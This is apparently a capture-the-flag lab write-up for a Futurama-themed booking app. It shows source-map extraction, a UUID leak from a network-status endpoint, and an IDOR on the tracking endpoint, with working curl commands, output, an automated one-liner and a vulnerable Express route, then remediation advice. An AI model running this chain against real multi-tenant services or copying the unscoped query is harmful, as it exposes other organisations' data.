---
title: Galaxy Dash - IDOR
tags:
  - bugforge
  - IDOR
  - broken-access-control
  - multi-tenant
  - information-disclosure
  - source-maps
aliases:
  - "/bugforge/galaxy-dash-idor/"
  - "/BugForge/Galaxy-Dash---IDOR"
---
- Galaxy Dash - a Futurama-themed B2B intergalactic delivery booking platform
- Multi-tenant architecture: each registration creates a separate organization
- IDOR chain: information disclosure endpoint leaks cross-org booking UUIDs, then tracking endpoint returns full booking data without org validation

## Enumeration

Set the target:

```bash
TARGET="https://lab-XXXXX.labs-app.bugforge.io"
```

### Endpoint Extraction + Source Maps

```bash
# Grab the main JS bundle filename
curl -sk "$TARGET" | grep -o 'static/js/main\.[a-f0-9]*\.js'
# main.1b7acf58.js

# Check for source map directive
curl -sk "$TARGET/static/js/main.1b7acf58.js" | tail -1
# //# sourceMappingURL=main.1b7acf58.js.map

# Download source map and extract original source files
curl -sk "$TARGET/static/js/main.1b7acf58.js.map" | python3 -c "
import json, sys, os
m = json.load(sys.stdin)
for i, name in enumerate(m.get('sources',[])):
    if 'node_modules' not in name:
        path = '/tmp/sm/' + name.split('/')[-1]
        os.makedirs(os.path.dirname(path), exist_ok=True)
        open(path, 'w').write(m['sourcesContent'][i])
        print(f'  [+] {name}')
"
```

Results:
- 20 API endpoints
- 11 React components extracted
- Express backend, CORS `*`, HS256 JWT with `id, username, organizationId, iat` (no expiry)

### Key Endpoints

| Method | Path | Notes |
|--------|------|-------|
| POST | /api/register | Creates user + org |
| POST | /api/login | Returns JWT |
| GET | /api/verify-token | Token validation |
| GET | /api/bookings/ | List own org bookings |
| POST | /api/bookings | Create booking |
| GET | /api/bookings/:id | Get booking (org-scoped) |
| GET | /api/bookings/:id/tracking | Tracking data (VULNERABLE) |
| GET | /api/bookings/stats/summary | Org stats |
| GET | /api/invoices/:id | Invoice (org-scoped) |
| POST | /api/calculate-price | Price calculator |
| GET | /api/locations | All delivery locations |
| GET | /api/services | Delivery service tiers |
| GET | /api/network/status | Network health (LEAKS DATA) |
| GET | /api/organization | Org details |
| GET/POST | /api/team | Team management |
| PUT | /api/team/:id | Update permissions |
| DELETE | /api/team/:id | Remove member |

### Source Code Signals

**BookingDetails.js:21,31,32** - three endpoints hit with interpolated booking ID from URL params:

```js
const { id } = useParams();

const [bookingRes, invoiceRes] = await Promise.all([
  axios.get(`/api/bookings/${id}`),        // org-scoped (safe)
  axios.get(`/api/invoices/${id}`)          // org-scoped (safe)
]);

// Separate tracking call - no org check visible
axios.get(`/api/bookings/${id}/tracking`);  // <-- VULNERABLE
```

**Dashboard.js** - references `/api/network/status` which returns recent shipments across ALL orgs:

```js
const networkRes = await axios.get('/api/network/status');
// Returns tracking_id UUIDs for active deliveries globally
```

This is the information disclosure that enables the IDOR. Without it, booking UUIDs are unguessable.

### Architecture Understanding

The app uses multi-tenancy via `organizationId` in the JWT:
- `GET /api/bookings/:id` checks `organization_id` matches JWT -- returns 404 for cross-org
- `GET /api/invoices/:id` checks `organization_id` matches JWT -- returns 404 for cross-org
- `GET /api/bookings/:id/tracking` does NOT check org ownership -- returns data for ANY valid UUID

## Exploitation

### Step 1 - Register Two Users in Separate Organizations

Each registration creates a new organization. We need two users in different orgs to prove cross-tenant access.

```bash
# Register User A (Organization A)
curl -sk -X POST "$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{
    "username":"alice_attacker",
    "email":"alice@orgA.com",
    "password":"Pass1234!",
    "full_name":"Alice Attacker",
    "org_name":"OrgA Corp",
    "business_type":"Technology",
    "headquarters_planet":"Earth"
  }'
```

```json
{
  "token": "eyJhbGciOiJIUzI1NiI...",
  "user": {
    "id": 5,
    "username": "alice_attacker",
    "role": "org_admin",
    "organizationId": 4,
    "permissions": {
      "can_view_deliveries": true,
      "can_create_deliveries": true,
      "can_edit_deliveries": true,
      "can_manage_team": true,
      "can_manage_org": true
    }
  }
}
```

```bash
# Save Alice's token
ALICE_TOKEN="eyJhbGciOiJIUzI1NiI..."

# Register User B (Organization B)
curl -sk -X POST "$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{
    "username":"bob_attacker",
    "email":"bob@orgB.com",
    "password":"Pass1234!",
    "full_name":"Bob Attacker",
    "org_name":"OrgB Inc",
    "business_type":"Mining",
    "headquarters_planet":"Mars"
  }'
```

```bash
# Save Bob's token
BOB_TOKEN="eyJhbGciOiJIUzI1NiI..."
```

Both users are `org_admin` of their respective organizations (orgId 4 and 5). The JWT contains:
- `id` - user ID
- `username` - username
- `organizationId` - tenant isolation key
- `iat` - issued at (no expiry)

### Step 2 - Create a Booking as Alice (establishes data to IDOR)

First get valid location and service IDs:

```bash
# Get locations
curl -sk -H "Authorization: Bearer $ALICE_TOKEN" "$TARGET/api/locations"
# Returns: id=1 "New New York" (Earth), id=3 "Los Angeles Ruins" (Earth), etc.

# Get services
curl -sk -H "Authorization: Bearer $ALICE_TOKEN" "$TARGET/api/services"
# Returns: id=3 "Standard Route" (1x multiplier, 24hrs)
```

Create a booking:

```bash
curl -sk -X POST "$TARGET/api/bookings" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "origin_location_id": 1,
    "destination_location_id": 3,
    "cargo_size": "medium",
    "cargo_weight_kg": 500,
    "cargo_description": "Secret OrgA cargo - confidential",
    "danger_level": 0,
    "has_insurance": false,
    "has_premium_tracking": false,
    "service_id": 3,
    "total_price": 150.00,
    "calculated_risk_percent": 5.0,
    "estimated_delivery_minutes": 1440
  }'
```

```json
{
  "id": "d7e042fd-228c-46b6-b519-8e46b89da8e5",
  "message": "Booking created successfully",
  "delivery_date": "2026-05-12T18:44:07.384Z"
}
```

Note the UUID. This is what we'll IDOR with Bob's token.

### Step 3 - Discover Booking UUIDs via Network Status (Info Disclosure)

The network status endpoint returns tracking IDs for ALL active deliveries across ALL organizations:

```bash
curl -sk -H "Authorization: Bearer $BOB_TOKEN" "$TARGET/api/network/status"
```

```json
{
  "active_deliveries": 2,
  "network_health": "operational",
  "recent_shipments": [
    {
      "tracking_id": "d7e042fd-228c-46b6-b519-8e46b89da8e5",
      "origin": "New New York",
      "origin_planet": "Earth",
      "destination": "Los Angeles Ruins",
      "destination_planet": "Earth",
      "status": "pending",
      "service": "Standard Route"
    },
    {
      "tracking_id": "ebb88ace-968a-40fe-8344-86f6cc7efb16",
      "origin": "New New York Spaceport",
      "origin_planet": "Earth",
      "destination": "Wormulon Slurm Factory",
      "destination_planet": "Wormulon",
      "status": "pending",
      "service": "Standard Route"
    }
  ]
}
```

Bob (orgId=5) can see Alice's booking UUID AND a pre-seeded booking from yet another org. This is the enumeration primitive - UUIDs are supposed to be unguessable, but this endpoint leaks them.

### Step 4 - Verify Org-Scoped Endpoints Are Protected (Baseline)

Confirm that the main booking and invoice endpoints properly enforce org isolation:

```bash
# Bob tries to read Alice's booking via the main endpoint
curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
  "$TARGET/api/bookings/d7e042fd-228c-46b6-b519-8e46b89da8e5"
```

```json
{"error": "Booking not found"}
```

```bash
# Bob tries to read Alice's invoice
curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
  "$TARGET/api/invoices/d7e042fd-228c-46b6-b519-8e46b89da8e5"
```

```json
{"error": "Booking not found"}
```

Both return 404. Good - these endpoints check `organization_id`. The tracking endpoint does NOT.

### Step 5 - IDOR on Tracking Endpoint (Cross-Org Data Access)

```bash
# Bob reads Alice's booking via the tracking endpoint
curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
  "$TARGET/api/bookings/d7e042fd-228c-46b6-b519-8e46b89da8e5/tracking"
```

```json
{
  "id": "d7e042fd-228c-46b6-b519-8e46b89da8e5",
  "status": "pending",
  "cargo_description": "Secret OrgA cargo - confidential",
  "cargo_size": "medium",
  "cargo_weight_kg": 500,
  "danger_level": 0,
  "calculated_risk_percent": 5,
  "total_price": 150,
  "estimated_delivery_minutes": 1440,
  "delivery_date": "2026-05-12T18:44:07.384Z",
  "actual_delivery_time": null,
  "has_insurance": 0,
  "has_premium_tracking": 0,
  "created_at": "2026-05-11 18:44:07",
  "origin_name": "New New York",
  "origin_planet": "Earth",
  "destination_name": "Los Angeles Ruins",
  "destination_planet": "Earth",
  "service_name": "Standard Route"
}
```

Full cross-org data leak. Bob sees Alice's:
- Cargo description (business-sensitive)
- Pricing information
- Route details (origin, destination, planet, sector)
- Delivery schedule
- Insurance and tracking status

### Step 6 - Read the Pre-Seeded Booking (Flag)

The network status endpoint also revealed a pre-seeded booking from the lab's default org. Apply the same IDOR:

```bash
curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
  "$TARGET/api/bookings/ebb88ace-968a-40fe-8344-86f6cc7efb16/tracking"
```

```json
{
  "id": "ebb88ace-968a-40fe-8344-86f6cc7efb16",
  "status": "pending",
  "cargo_description": "bug{hl6ojcRtF7s77WLp8qQq2dLoeYkQ8LJL}",
  "cargo_size": "medium",
  "cargo_weight_kg": 120,
  "danger_level": 1,
  "calculated_risk_percent": 12,
  "total_price": 1440,
  "estimated_delivery_minutes": 1440,
  "delivery_date": "2026-05-12 18:39:00",
  "actual_delivery_time": null,
  "has_insurance": 0,
  "has_premium_tracking": 0,
  "created_at": "2026-05-11 18:39:00",
  "origin_name": "New New York Spaceport",
  "origin_planet": "Earth",
  "destination_name": "Wormulon Slurm Factory",
  "destination_planet": "Wormulon",
  "service_name": "Standard Route"
}
```

Flag is in the `cargo_description` field of the other org's booking.

## TL;DR - Speedrun (4 commands)

```bash
TARGET="https://lab-XXXXX.labs-app.bugforge.io"

# 1. Register a user (creates your own org)
BOB_TOKEN=$(curl -sk -X POST "$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"pwn","email":"pwn@test.com","password":"Pass123!","full_name":"pwn","org_name":"PwnOrg","business_type":"General","headquarters_planet":"Earth"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# 2. Enumerate all active booking UUIDs via network status
curl -sk -H "Authorization: Bearer $BOB_TOKEN" "$TARGET/api/network/status" \
  | python3 -c "import sys,json; [print(s['tracking_id']) for s in json.load(sys.stdin)['recent_shipments']]"

# 3. IDOR each UUID via the tracking endpoint (flag is in cargo_description)
# Replace UUID below with output from step 2
curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
  "$TARGET/api/bookings/ebb88ace-968a-40fe-8344-86f6cc7efb16/tracking"
```

Or as a one-liner that finds the flag automatically:

```bash
TARGET="https://lab-XXXXX.labs-app.bugforge.io" && \
TOKEN=$(curl -sk -X POST "$TARGET/api/register" -H "Content-Type: application/json" \
  -d "{\"username\":\"pwn$(date +%s)\",\"email\":\"pwn$(date +%s)@x.com\",\"password\":\"P1!\",\"full_name\":\"x\",\"org_name\":\"x\",\"business_type\":\"General\",\"headquarters_planet\":\"Earth\"}" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])") && \
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/network/status" \
  | python3 -c "
import sys,json,subprocess
data = json.load(sys.stdin)
for s in data['recent_shipments']:
    r = subprocess.run(['curl','-sk','-H',f'Authorization: Bearer $TOKEN',
        f'$TARGET/api/bookings/{s[\"tracking_id\"]}/tracking'],
        capture_output=True, text=True)
    j = json.loads(r.stdout)
    if 'bug{' in j.get('cargo_description',''):
        print(f'FLAG: {j[\"cargo_description\"]}')
        break
"
```

## Why This Works - The Inconsistency

The developer correctly added org-scoping to most endpoints:

```js
// SECURE: /api/bookings/:id
app.get('/api/bookings/:id', auth, (req, res) => {
  const booking = db.get(
    'SELECT * FROM bookings WHERE id = ? AND organization_id = ?',
    [req.params.id, req.user.organizationId]  // org check
  );
  if (!booking) return res.status(404).json({error: 'Booking not found'});
  res.json(booking);
});

// VULNERABLE: /api/bookings/:id/tracking
app.get('/api/bookings/:id/tracking', auth, (req, res) => {
  const booking = db.get(
    'SELECT * FROM bookings WHERE id = ?',
    [req.params.id]  // NO org check - just validates UUID exists
  );
  res.json(booking);
});
```

The tracking endpoint was likely added later (or by a different developer) and the org filter was forgotten. This is a common pattern -- the "main" CRUD endpoints are properly scoped, but auxiliary/utility endpoints miss the check.

The `/api/network/status` endpoint compounds the issue by leaking UUIDs globally. Even without it, the IDOR exists -- but UUIDs would need to be brute-forced (infeasible) or obtained through other means.

## Security Takeaways

### Vulnerabilities

1. **IDOR on `/api/bookings/:id/tracking`** - missing organization ownership check allows cross-tenant data access
2. **Information Disclosure on `/api/network/status`** - leaks booking UUIDs from all orgs, enabling the IDOR

### Impact

- Cross-organization data breach: cargo descriptions, pricing, routes, delivery schedules
- Business intelligence leak: competitors can see each other's shipping patterns and volumes
- In a real deployment: cargo contents, trade routes, and pricing are highly sensitive business data

### Root Cause

- Inconsistent authorization: some endpoints check `organization_id`, the tracking endpoint does not
- Network status endpoint designed for "public dashboard" feel but exposes tenant-specific identifiers
- UUID-as-security: the developer may have assumed UUIDs are unguessable and skipped the org check on tracking

### Remediation

- Add `AND organization_id = ?` to ALL booking queries, including tracking
- Scope `/api/network/status` to only show the requesting org's shipments
- Add middleware that enforces org-scoping at the route level rather than per-query
- Never rely on UUID unguessability as an access control mechanism
